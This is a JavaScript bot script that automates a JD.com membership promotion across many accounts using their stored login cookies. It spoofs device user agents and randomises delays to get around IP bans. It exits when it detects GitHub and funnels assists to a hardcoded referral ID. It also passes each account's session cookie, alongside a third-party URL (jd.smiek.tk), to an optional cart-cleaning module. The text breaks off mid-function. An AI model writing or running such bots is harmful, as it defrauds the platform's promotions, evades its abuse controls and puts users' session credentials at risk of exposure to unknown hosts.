/*
2.14~2.21 大牌联合 臻宠会员 [gua_opencard.js]
新增开卡脚本
一次性脚本

1.邀请一人20豆
2.开2张卡 成功开1张 有机会获得10豆
3.关注5京豆
4.加购5京豆

*/
let guaopencard_addSku = "false"
let guaopencard = "false"
let guaopenwait = "0"
let guaopencard_draw = "0"

const $ = new Env('2.14~2.21 大牌联合 臻宠会员');
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
const notify = $.isNode() ? require('./sendNotify') : '';
let cleanCart = ''
if($.isNode()){
  try{
    const fs = require('fs');
    if (fs.existsSync('./cleancart_activity.js')) {
      cleanCart = require('./cleancart_activity');
    }
  }catch(e){
  }
}
//IOS等用户直接用NobyDa的jd cookie

let cookiesArr = [],
    cookie = '';
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
} else {
  cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}
guaopencard_addSku = true;
guaopencard_addSku = true;
guaopencard = true;
guaopencard = true;
guaopenwait = true;
guaopenwait = true;
guaopenwait = parseInt(guaopenwait, 10) || 0
allMessage = ""
allMessage = ""
message = ""
$.hotFlag = false
$.outFlag = false
$.activityEnd = false
let lz_jdpin_token_cookie =''
let activityCookie =''
!(async () => {
  // if ($.isNode()) {
  //   if(guaopencard+"" != "true"){
  //     console.log('如需执行脚本请设置环境变量[guaopencard108]为"true"')
  //   }
  //   if(guaopencard+"" != "true"){
  //     return
  //   }
  // }
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/', {
      "open-url": "https://bean.m.jd.com/"
    });
    return;
  }
  $.shareUuid = "67d94d615bed408bb96ccfa0fc3dabba"
  for (let i = 0; i < cookiesArr.length; i++) {
    cookie = cookiesArr[i];
    if (cookie) {
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
      $.index = i + 1;
      message = ""
      $.bean = 0
      $.hotFlag = false
      $.nickName = '';
      console.log(`\n\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      await getUA()
      await run();
      if(i == 0 && !$.actorUuid) break
      if($.outFlag || $.activityEnd) break
      
    }
  }
  if($.outFlag) {
    let msg = '此ip已被限制，请过10分钟后再执行脚本'
    $.msg($.name, ``, `${msg}`);
    if ($.isNode()) await notify.sendNotify(`${$.name}`, `${msg}`);
  }
})()
    .catch((e) => $.logErr(e))
    .finally(() => $.done())


async function run() {
  try {
    $.hasEnd = true
    $.endTime = 0
    lz_jdpin_token_cookie = ''
    $.Token = ''
    $.Pin = ''
    let flag = false
    await takePostRequest('isvObfuscator');
	await toToken($.index);
    if($.Token == ''){
      console.log('获取[token]失败！')
      return
    }
    await getCk()
    if (activityCookie == '') {
      console.log(`获取cookie失败`); return;
    }
    if($.activityEnd === true){
      console.log('活动结束')
      return
    }
    if($.outFlag){
      console.log('此ip已被限制，请过10分钟后再执行脚本\n')
      return
    }
    await takePostRequest('getSimpleActInfoVo');
    await takePostRequest('getMyPing');
    if(!$.Pin){
      console.log('获取[Pin]失败！')
      return
    }
    await takePostRequest('accessLogWithAD');
    await takePostRequest('getUserInfo');
    await takePostRequest('activityContent');
    if($.hotFlag) return
    if(!$.actorUuid){
      console.log('获取不到[actorUuid]退出执行，请重新执行')
      return
    }
    if($.hasEnd === true || Date.now() > $.endTime){
      $.activityEnd = true
      console.log('活动结束')
      return
    }
    await takePostRequest('drawContent');
    await $.wait(1000)
    $.openList = []
    $.allOpenCard = false
    await takePostRequest('info');
    await takePostRequest('checkOpenCard');
    // console.log($.actorUuid)
    // return
    if($.allOpenCard == false){
      console.log('开卡任务')
      for(o of $.openList){
        $.openCard = false
        if(o.status == 0){
          flag = true
          $.joinVenderId = o.venderId
          await joinShop()
          await $.wait(parseInt(Math.random() * 2000 + 2000, 10))
          await takePostRequest('activityContent');
          await takePostRequest('drawContent');
          await takePostRequest('checkOpenCard');
          await $.wait(parseInt(Math.random() * 3000 + 2000, 10))
        }
      }
    }else{
      console.log('已全部开卡')
    }
    
    $.log("关注: " + $.followShop)
    if(!$.followShop && !$.outFlag){
      flag = true
      await takePostRequest('followShop');
      await $.wait(parseInt(Math.random() * 2000 + 3000, 10))
    }
    $.yaoqing = false
    await takePostRequest('邀请');
    if($.yaoqing){
      await takePostRequest('助力');
    }
    // await takePostRequest('startDraw');

    $.log("加购: " + $.addCart)
    if(!$.addCart && !$.outFlag){
      if(guaopencard_addSku+"" == "true"){
        flag = true
        let goodsArr = []
        if(cleanCart){
          goodsArr = await cleanCart.clean(cookie,'https://jd.smiek.tk/jdcleancatr_21102717','')
          await $.wait(parseInt(Math.random() * 1000 + 4000, 10))
        }
        await takePostRequest('addCart');
        await $.wait(parseInt(Math.random() * 2000 + 4000, 10))
        if(cleanCart && goodsArr !== false){
          // await $.wait(parseInt(Math.random() * 1000 + 4000, 10))
          // console.log(goodsArr)
          await cleanCart.clean(cookie,'https://jd.smiek.tk/jdcleancatr_21102717',goodsArr || [ ])
        }
      }
      // else{
      //   console.log('如需加购请设置环境变量[guaopencard_addSku108]为"true"');
      // }
    }
    if(flag){
      await takePostRequest('activityContent');
    }
    console.log(`${$.score}值`)
    if(guaopencard_draw+"" !== "0"){
      $.runFalag = true
      let count = parseInt($.score/100)
      guaopencard_draw = parseInt(guaopencard_draw, 10)
      if(count > guaopencard_draw) count = guaopencard_draw
      console.log(`抽奖次数为:${count}`)
      for(m=1;count--;m++){
        console.log(`第${m}次抽奖`)
        await takePostRequest('抽奖');
        if($.runFalag == false) break
        if(Number(count) <= 0) break
        if(m >= 10){
          console.log("抽奖太多次，多余的次数请再执行脚本")
          break
        }
        await $.wait(parseInt(Math.random() * 2000 + 2000, 10))
      }
    }
    // else console.log('如需抽奖请设置环境变量[guaopencard_draw108]为"3" 3为次数');
    
    await $.wait(parseInt(Math.random() * 1000 + 2000, 10))
    await takePostRequest('getDrawRecordHasCoupon');
    await takePostRequest('getShareRecord');
    if($.outFlag){
      console.log('此ip已被限制，请过10分钟后再执行脚本\n')
      return
    }
    console.log($.actorUuid)
    console.log(`当前助力:${$.shareUuid}`)
    if($.index == 1){
      $.shareUuid = $.actorUuid
      console.log(`后面的号都会助力:${$.shareUuid}`)
    }
    await $.wait(parseInt(Math.random() * 1000 + 5000, 10))
    if(flag) await $.wait(parseInt(Math.random() * 1000 + 10000, 10))
    if(guaopenwait){
      if($.index != cookiesArr.length){
        console.log(`等待${guaopenwait}秒`)
        await $.wait(parseInt(guaopenwait, 10) * 1000)
      }
    }
    // else{
    //   if($.index % 3 == 0) console.log('休息1分钟，别被黑ip了\n可持续发展')
    //   if($.index % 3 == 0) await $.wait(parseInt(Math.random() * 5000 + 60000, 10))
    // }
  } catch (e) {
    console.log(e)
  }
}

async function takePostRequest(type) {
  if($.outFlag) return
  let domain = 'https://lzdz1-isv.isvjcloud.com';
  let body = ``;
  let method = 'POST'
  let admJson = ''
  switch (type) {
    case 'isvObfuscator':
      url = `https://api.m.jd.com/client.action?functionId=isvObfuscator`;
      body = `body=%7B%22url%22%3A%22https%3A//lzdz1-isv.isvjcloud.com%22%2C%22id%22%3A%22%22%7D&uuid=7088d9018515b8cb0c88ace6e5479762af3e88f3&client=apple&clientVersion=10.1.4&st=1634343624086&sv=120&sign=8b9cea22c3a0d77026abda5d37d2b7e3`;
      break;
      case 'getSimpleActInfoVo':
        url = `${domain}/dz/common/getSimpleActInfoVo`;
        body = `activityId=union235434985dzlhkk`;
        break;
      case 'getMyPing':
        url = `${domain}/customer/getMyPing`;
        body = `userId=${$.shopId || $.venderId || ''}&token=${$.Token}&fromType=APP`;
        break;
      case 'accessLogWithAD':
        url = `${domain}/common/accessLogWithAD`;
        let pageurl = `${domain}/drawCenter/activity?activityId=union235434985dzlhkk&shareUuid=${$.shareUuid}`
        body = `venderId=${$.shopId || $.venderId || ''}&code=99&pin=${encodeURIComponent($.Pin)}&activityId=union235434985dzlhkk&pageUrl=${encodeURIComponent(pageurl)}&subType=app&adSource=`
        break;
      case 'getUserInfo':
        url = `${domain}/wxActionCommon/getUserInfo`;
        body = `pin=${encodeURIComponent($.Pin)}`;
        break;
      case 'activityContent':
        url = `${domain}/dingzhi/linkgame/activity/content`;
        body = `activityId=union235434985dzlhkk&pin=${encodeURIComponent($.Pin)}&pinImg=${encodeURIComponent($.attrTouXiang)}&nick=${encodeURIComponent($.nickname)}&cjyxPin=&cjhyPin=&shareUuid=${$.shareUuid}`
        break;
      case 'drawContent':
        url = `${domain}/dingzhi/taskact/common/drawContent`;
        body = `activityId=union235434985dzlhkk&pin=${encodeURIComponent($.Pin)}`
        break;
      case 'checkOpenCard':
        url = `${domain}/dingzhi/linkgame/checkOpenCard`;
        body = `activityId=union235434985dzlhkk&pin=${encodeURIComponent($.Pin)}`
        break;
      case 'info':
        url = `${domain}/dingzhi/linkgame/task/opencard/info`;
        body = `activityId=union235434985dzlhkk&pin=${encodeURIComponent($.Pin)}&actorUuid=${$.actorUuid}`
        break;
      case 'startDraw':
        url = `${domain}/joint/order/draw`;
        body = `activityId=union235434985dzlhkk&pin=${encodeURIComponent($.Pin)}&actorUuid=${$.actorUuid}&drawType=1`
        break;
      case 'followShop':
        url = `${domain}/dingzhi/opencard/follow/shop`;
        // url = `${domain}/dingzhi/dz/openCard/saveTask`;
        body = `activityId=union235434985dzlhkk&pin=${encodeURIComponent($.Pin)}`
        break;
      case 'sign':
      case 'addCart':
      case 'browseGoods':
        url = `${domain}/dingzhi/linkgame/${type}`;
        body = `activityId=union235434985dzlhkk&pin=${encodeURIComponent($.Pin)}`
        if(type == 'browseGoods') body += `&value=${$.visitSkuValue}`
        break;
      case '邀请':
      case '助力':
        if(type == '助力'){
          url = `${domain}/dingzhi/linkgame/assist`;
        }else{
          url = `${domain}/dingzhi/linkgame/assist/status`;
        }
        body = `activityId=union235434985dzlhkk&pin=${encodeURIComponent($.Pin)}&shareUuid=${$.shareUuid}`
        break;
      case 'viewVideo':
      case 'visitSku':
      case 'toShop':
      case 'addSku':
        url = `${domain}/dingzhi/opencard/${type}`;
        let taskType = ''
        let taskValue = ''
        if(type == 'viewVideo'){
          taskType = 31
          taskValue = 31
        }else if(type == 'visitSku'){
          taskType = 5
          taskValue = $.visitSkuValue || 5
        }else if(type == 'toShop'){
          taskType = 14
          taskValue = $.toShopValue || 14
        }else if(type == 'addSku'){
          taskType = 2
          taskValue = $.addSkuValue || 2
        }
        body = `activityId=union235434985dzlhkk&pin=${encodeURIComponent($.Pin)}&actorUuid=${$.actorUuid}&taskType=${taskType}&taskValue=${taskValue}`
        break;
      case 'getDrawRecordHasCoupon':
        url = `${domain}/dingzhi/linkgame/draw/record`;
        body = `activityId=union235434985dzlhkk&pin=${encodeURIComponent($.Pin)}&actorUuid=${$.actorUuid}`
        break;
      case 'getShareRecord':
        url = `${domain}/dingzhi/linkgame/help/list`;
        body = `activityId=union235434985dzlhkk&pin=${encodeURIComponent($.Pin)}`
        break;
      case '抽奖':
        url = `${domain}/dingzhi/opencard/draw`;
        body = `activityId=union235434985dzlhkk&actorUuid=${$.actorUuid}&pin=${encodeURIComponent($.Pin)}`
        break;
      default:
        console.log(`错误${type}`);
    }
    let myRequest = getPostRequest(url, body, method);
    // console.log(myRequest)
    return new Promise(async resolve => {
      $.post(myRequest, (err, resp, data) => {
        try {
          setActivityCookie(resp)
          if (err) {
            if(resp && typeof resp.statusCode != 'undefined'){
              if(resp.statusCode == 493){
                console.log('此ip已被限制，请过10分钟后再执行脚本\n')
                $.outFlag = true
              }
            }
            console.log(`${$.toStr(err,err)}`)
            console.log(`${type} API请求失败，请检查网路重试`)
          } else {
            dealReturn(type, data);
          }
        } catch (e) {
          // console.log(data);
          console.log(e, resp)
        } finally {
          resolve();
        }
      })
    })
  }
  
async function dealReturn(type, data) {
  let res = ''
  try {
    if(type != 'accessLogWithAD' || type != 'drawContent'){
      if(data){
        res = JSON.parse(data);
      }
    }
  } catch (e) {
    console.log(`${type} 执行任务异常`);
    console.log(data);
    $.runFalag = false;
  }
  try {
    switch (type) {
      case 'isvObfuscator':
        if(typeof res == 'object'){
          if(res.errcode == 0){
            if(typeof res.token != 'undefined') $.Token = res.token
          }else if(res.message){
            console.log(`isvObfuscator ${res.message || ''}`)
          }else{
            console.log(data)
          }
        }else{
          console.log(data)
        }
        break;
      case 'getSimpleActInfoVo':
        if(typeof res == 'object'){
          if(res.result && res.result === true){
            if(typeof res.data.shopId != 'undefined') $.shopId = res.data.shopId
            if(typeof res.data.venderId != 'undefined') $.venderId = res.data.venderId
          }else if(res.errorMessage){
            console.log(`${type} ${res.errorMessage || ''}`)
          }else{
            console.log(`${type} ${data}`)
          }
        }else{
          console.log(`${type} ${data}`)
        }
        break;
      case 'getMyPing':
        if(typeof res == 'object'){
          if(res.result && res.result === true){
            if(res.data && typeof res.data.secretPin != 'undefined') $.Pin = res.data.secretPin
            if(res.data && typeof res.data.nickname != 'undefined') $.nickname = res.data.nickname
          }else if(res.errorMessage){
            console.log(`${type} ${res.errorMessage || ''}`)
          }else{
            console.log(`${type} ${data}`)
          }
        }else{
          console.log(`${type} ${data}`)
        }
        break;
      case 'getUserInfo':
        if(typeof res == 'object'){
          if(res.result && res.result === true){
            if(res.data && typeof res.data.yunMidImageUrl != 'undefined') $.attrTouXiang = res.data.yunMidImageUrl || "https://img10.360buyimg.com/imgzone/jfs/t1/7020/27/13511/6142/5c5138d8E4df2e764/5a1216a3a5043c5d.png"
          }else if(res.errorMessage){
            console.log(`${type} ${res.errorMessage || ''}`)
          }else{
            console.log(`${type} ${data}`)
          }
        }else{
          console.log(`${type} ${data}`)
        }
        break;
      case 'activityContent':
        if(typeof res == 'object'){
          if(res.result && res.result === true){
            $.endTime = res.data.endTime || (res.data.activityVo && res.data.activityVo.endTime) || res.data.activity.endTime || 0
            $.hasEnd = res.data.isEnd || false
            $.drawCount = res.data.actor.drawCount || 0
            $.point = res.data.actor.point || 0
            $.score = res.data.actor.score || 0
            $.actorUuid = res.data.actor.actorUuid || ''
            $.followShop = res.data.actor.followShopStatus || ''
          }else if(res.errorMessage){
            console.log(`${type} ${res.errorMessage || ''}`)
          }else{
            console.log(`${type} ${data}`)
          }
        }else{
          console.log(`${type} ${data}`)
        }
        break;
      case 'info':
        if(typeof res == 'object'){
          if(res.result && res.result === true){
            // $.drawCount = res.data.drawCount || 0
            $.addCart = res.data.addCart || false
            // $.followShop = res.data.followShop || false
            // $.sign = res.data.isSignStatus || false
            // $.visitSku = res.data.visitSku || false
            // $.visitSkuList = res.data.visitSkuList || []
          }else if(res.errorMessage){
            console.log(`${type} ${res.errorMessage || ''}`)
          }else{
            console.log(`${type} ${data}`)
          }
        }else{
          console.log(`${type} ${data}`)
        }
        break;
      case 'checkOpenCard':
        if(typeof res == 'object'){
          if(res.result && res.result === true){
            let cardList1 = res.data.cardList1 || []
            let cardList2 = res.data.cardList2 || []
            let cardList = res.data.cardList || []
            let openCardList = res.data.openCardList || []
            $.openList = [...cardList,...cardList1,...cardList2,...openCardList]
            $.allOpenCard = res.data.allOpenCard || res.data.isOpenCardStatus || false
            $.openCardScore1 = res.data.score1 || 0
            $.openCardScore2 = res.data.score2 || 0
            $.drawScore = res.data.drawScore || 0
            if(res.data.beans || res.data.addBeanNum) console.log(`开卡获得:${res.data.beans || res.data.addBeanNum}豆`)
          }else if(res.errorMessage){
            console.log(`${type} ${res.errorMessage || ''}`)
          }else{
            console.log(`${type} ${data}`)
          }
        }else{
          console.log(`${type} ${data}`)
        }
        break;
      case 'startDraw':
      case 'followShop':
      case 'viewVideo':
      case 'visitSku':
      case 'toShop':
      case 'addSku':
      case 'sign':
      case 'addCart':
      case 'browseGoods':
      case '抽奖':
        if(typeof res == 'object'){
          if(res.result && res.result === true){
            if(typeof res.data == 'object'){
              let msg = ''
              let title = '抽奖'
              if(res.data.addBeanNum){
                msg = `${res.data.addBeanNum}京豆`
              }
              if(res.data.addPoint){
                msg += ` ${res.data.addPoint}游戏机会`
              }
              if(type == 'followShop'){
                title = '关注'
                if(res.data.beanNumMember && res.data.assistSendStatus){
                  msg += ` 额外获得:${res.data.beanNumMember}京豆`
                }
              }else if(type == 'addSku' || type == 'addCart'){
                title = '加购'
              }else if(type == 'viewVideo'){
                title = '热门文章'
              }else if(type == 'toShop'){
                title = '浏览店铺'
              }else if(type == 'visitSku' || type == 'browseGoods'){
                title = '浏览商品'
              }else if(type == 'sign'){
                title = '签到'
              }else{
                msg = res.data.drawOk == true && (res.data.drawInfoType == 6 && res.data.name || '') || '空气💨'
              }
              if(!msg){
                msg = '空气💨'
              }
              console.log(`${title}获得:${msg || data}`)
            }else{
              console.log(`${type} ${data}`)
            }
          }else if(res.errorMessage){
            $.runFalag = false;
            console.log(`${type} ${res.errorMessage || ''}`)
          }else{
            console.log(`${type} ${data}`)
          }
        }else{
          console.log(`${type} ${data}`)
        }
        break;
      case 'getDrawRecordHasCoupon':
        if(typeof res == 'object'){
          if(res.result && res.result === true){
            console.log(`我的奖品：`)
            let num = 0
            let value = 0
            for(let i in res.data.recordList){
              let item = res.data.recordList[i]
              if(item.infoName == '20京豆'){
                num++
                value = item.infoName.replace('京豆','')
              }else{
                console.log(`${item.infoType != 10 && item.value && item.value +':' || ''}${item.infoName}`)
              }
            }
            if(num > 0) console.log(`邀请好友(${num}):${num*parseInt(value, 10) || 30}京豆`)
          }else if(res.errorMessage){
            console.log(`${type} ${res.errorMessage || ''}`)
          }else{
            console.log(`${type} ${data}`)
          }
        }else{
          console.log(`${type} ${data}`)
        }
        break;
      case 'getShareRecord':
        if(typeof res == 'object'){
          if(res.result && res.result === true && res.data){
            $.ShareCount = res.data.shareList.length
            $.log(`=========== 你邀请了:${res.data.shareList.length}个`)
          }else if(res.errorMessage){
            console.log(`${type} ${res.errorMessage || ''}`)
          }else{
            console.log(`${type} ${data}`)
          }
        }else{
          console.log(`${type} ${data}`)
        }
        break;
      case '邀请':
      case '助力':
        // console.log(data)
        if(typeof res == 'object'){
          if(res.data.status == 200){
            if(type == '助力'){
              console.log('助力成功')
            }else{
              $.yaoqing = true
            }
          }else if(res.data.status == 105){
            console.log('已经助力过')
          }else if(res.data.status == 104){
            console.log('已经助力其他人')
          }else if(res.data.status == 101){
            // console.log('已经助力过')
          }else{
            console.log(data)
          }
        }else{
          console.log(`${type} ${data}`)
        }

      case 'accessLogWithAD':
      case 'drawContent':
        break;
      default:
        console.log(`${type}-> ${data}`);
    }
    if(typeof res == 'object'){
      if(res.errorMessage){
        if(res.errorMessage.indexOf('火爆') >-1 ){
          $.hotFlag = true
        }
      }
    }
  } catch (e) {
    console.log(e)
  }
}

function getPostRequest(url, body, method="POST") {
  let headers = {
    "Accept": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-cn",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": cookie,
    "User-Agent": $.UA,
    "X-Requested-With": "XMLHttpRequest"
  }
  if(url.indexOf('https://lzdz1-isv.isvjcloud.com') > -1){
    headers["Referer"] = `https://lzdz1-isv.isvjcloud.com/dingzhi/customized/common/activity?activityId=union235434985dzlhkk&shareUuid=${$.shareUuid}`
    headers["Cookie"] = `${lz_jdpin_token_cookie && lz_jdpin_token_cookie || ''}${$.Pin && "AUTH_C_USER=" + $.Pin + ";" || ""}${activityCookie}`
  }
  // console.log(headers)
  // console.log(headers.Cookie)
  return  {url: url, method: method, headers: headers, body: body, timeout:30000};
}

function getCk() {
  return new Promise(resolve => {
    let get = {
      url:`https://lzdz1-isv.isvjcloud.com/dingzhi/customized/common/activity?activityId=union235434985dzlhkk&shareUuid=${$.shareUuid}`,
      followRedirect:false,
      headers: {
        "User-Agent": $.UA,
      },
      timeout:30000
    }
    $.get(get, async(err, resp, data) => {
      try {
        if (err) {
          if(resp && typeof resp.statusCode != 'undefined'){
            if(resp.statusCode == 493){
              console.log('此ip已被限制，请过10分钟后再执行脚本\n')
              $.outFlag = true
            }
          }
          console.log(`${$.toStr(err)}`)
          console.log(`${$.name} cookie API请求失败，请检查网路重试`)
        } else {
          let end = data.match(/(活动已经结束)/) && data.match(/(活动已经结束)/)[1] || ''
          if(end){
            $.activityEnd = true
            console.log('活动已结束')
          }
          setActivityCookie(resp)
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function setActivityCookie(resp){
  let LZ_TOKEN_KEY = ''
  let LZ_TOKEN_VALUE = ''
  let lz_jdpin_token = ''
  let setcookies = resp && resp['headers'] && (resp['headers']['set-cookie'] || resp['headers']['Set-Cookie'] || '') || ''
  let setcookie = ''
  if(setcookies){
    if(typeof setcookies != 'object'){
      setcookie = setcookies.split(',')
    }else setcookie = setcookies
    for (let ck of setcookie) {
      let name = ck.split(";")[0].trim()
      if(name.split("=")[1]){
        // console.log(name.replace(/ /g,''))
        if(name.indexOf('LZ_TOKEN_KEY=')>-1) LZ_TOKEN_KEY = name.replace(/ /g,'')+';'
        if(name.indexOf('LZ_TOKEN_VALUE=')>-1) LZ_TOKEN_VALUE = name.replace(/ /g,'')+';'
        if(name.indexOf('lz_jdpin_token=')>-1) lz_jdpin_token = ''+name.replace(/ /g,'')+';'
      }
    }
  }
  if(LZ_TOKEN_KEY && LZ_TOKEN_VALUE) activityCookie = `${LZ_TOKEN_KEY} ${LZ_TOKEN_VALUE}`
  if(lz_jdpin_token) lz_jdpin_token_cookie = lz_jdpin_token
}

async function getUA(){
  $.UA = `jdapp;iPhone;10.1.4;13.1.2;${randomString(40)};network/wifi;model/iPhone8,1;addressid/2308460611;appBuild/167814;jdSupportDarkMode/0;Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1`
}
function randomString(e) {
  e = e || 32;
  let t = "abcdef0123456789", a = t.length, n = "";
  for (i = 0; i < e; i++)
    n += t.charAt(Math.floor(Math.random() * a));
  return n
}


function joinShop() {
  if(!$.joinVenderId) return
  return new Promise(async resolve => {
    $.shopactivityId = ''
    await $.wait(1000)
    await getshopactivityId()
    let activityId = ``
    if($.shopactivityId) activityId = `,"activityId":${$.shopactivityId}`
    const options = {
      url: `https://api.m.jd.com/client.action?appid=jd_shop_member&functionId=bindWithVender&body={"venderId":"${$.joinVenderId}","shopId":"${$.joinVenderId}","bindByVerifyCodeFlag":1,"registerExtend":{},"writeChildFlag":0${activityId},"channel":401}&client=H5&clientVersion=9.2.0&uuid=88888`,
      headers: {
        'Content-Type': 'text/plain; Charset=UTF-8',
        'Origin': 'https://api.m.jd.com',
        'Host': 'api.m.jd.com',
        'accept': '*/*',
        'User-Agent': $.UA,
        'content-type': 'application/x-www-form-urlencoded',
        'Cookie': cookie
      }
    }
    $.get(options, async (err, resp, data) => {
      try {
        // console.log(data)
        let res = $.toObj(data,data);
        if(typeof res == 'object'){
          if(res.success === true){
            console.log(res.message)
            if(res.result && res.result.giftInfo){
              for(let i of res.result.giftInfo.giftList){
                console.log(`入会获得:${i.discountString}${i.prizeName}${i.secondLineDesc}`)
              }
            }
          }else if(typeof res == 'object' && res.message){
            console.log(`${res.message || ''}`)
          }else{
            console.log(data)
          }
        }else{
          console.log(data)
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function getshopactivityId() {
  return new Promise(resolve => {
    const options = {
      url: `https://api.m.jd.com/client.action?appid=jd_shop_member&functionId=getShopOpenCardInfo&body=%7B%22venderId%22%3A%22${$.joinVenderId}%22%2C%22channel%22%3A401%7D&client=H5&clientVersion=9.2.0&uuid=88888`,
      headers: {
        'Content-Type': 'text/plain; Charset=UTF-8',
        'Origin': 'https://api.m.jd.com',
        'Host': 'api.m.jd.com',
        'accept': '*/*',
        'User-Agent': $.UA,
        'content-type': 'application/x-www-form-urlencoded',
        'Cookie': cookie
      }
    }
    $.get(options, async (err, resp, data) => {
      try {
        let res = $.toObj(data,data);
        if(typeof res == 'object'){
          if(res.success == true){
            // console.log($.toStr(res.result))
            console.log(`入会:${res.result.shopMemberCardInfo.venderCardName || ''}`)
            $.shopactivityId = res.result.interestsRuleList && res.result.interestsRuleList[0] && res.result.interestsRuleList[0].interestsInfo && res.result.interestsRuleList[0].interestsInfo.activityId || ''
          }
        }else{
          console.log(data)
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}


// prettier-ignore
function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete 